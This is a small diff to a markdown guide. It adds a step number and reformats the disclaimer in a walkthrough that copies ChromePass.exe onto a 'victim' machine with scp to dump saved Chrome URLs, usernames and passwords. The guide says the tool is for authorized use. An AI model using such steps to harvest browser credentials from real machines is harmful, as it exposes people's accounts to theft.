@@ -54,7 +54,7 @@ victim> hostname
 ```bash
 attacker> scp D:\Tools\ChromePass.exe victim@192.168.1.100:C:\Temp\
 ```
-Check on the victim machine:
+3. Check on the victim machine:
 ```
 victim> dir C:\Temp
 ChromePass.exe
@@ -116,7 +116,7 @@ You should see a list of saved Chrome URLs, usernames, and passwords.
 
 ---
 
-⚠ Disclaimer
+> ⚠ Disclaimer
 
 This tool is strictly for authorized use:
 
